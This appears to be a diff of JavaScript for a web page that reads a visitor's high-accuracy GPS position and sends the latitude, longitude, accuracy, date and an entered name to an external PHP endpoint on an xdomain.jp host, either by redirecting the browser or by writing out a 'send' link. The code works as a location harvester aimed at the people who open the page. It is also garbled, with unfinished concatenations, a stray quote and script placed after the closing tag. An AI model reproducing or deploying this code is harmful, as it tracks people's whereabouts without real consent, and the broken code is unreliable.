@@ -19,9 +19,21 @@ navigator.geolocation.getCurrentPosition( (position) => {
     enableHighAccuracy: true
 });
 
-
+var dt = document.getElementById(dt);
+var dt = "http://yumaabckhh.php.xdomain.jp/h.php?get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu + "&name=" + ;
 
 function load() {
 location.href = "http://yumaabckhh.php.xdomain.jp/h.php?get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu";
 }
 </script>
+
+
+function display(lat, lng, accu) {
+
+document.write("");
+
+var textname = document.getElementById('textname').value;
+var dt = document.getElementById(dt);
+var dt = "http://yumaabckhh.php.xdomain.jp/h.php?get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu + "&name=" + ;
+document.write(+ date + ">送信</a>");
+}
